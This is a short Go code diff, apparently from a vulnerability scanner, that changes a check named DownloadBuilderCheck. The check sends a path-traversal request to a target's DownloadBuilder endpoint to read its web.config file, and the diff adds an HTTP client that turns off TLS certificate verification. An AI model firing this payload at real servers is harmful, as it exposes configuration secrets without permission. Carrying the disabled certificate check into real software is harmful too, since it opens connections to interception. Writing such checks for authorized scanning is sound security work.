@@ -1,6 +1,7 @@
 package vulList
 
 import (
+	"crypto/tls"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -10,8 +11,14 @@ import (
 )
 
 func DownloadBuilderCheck(target string) error {
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
+		},
+	}
 	baseurl := target + "BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
-	resp, err := http.Get(baseurl)
+	resp, err := client.Get(baseurl)
 	if err != nil {
 		return fmt.Errorf("Error sending request: %v", err)
 	}
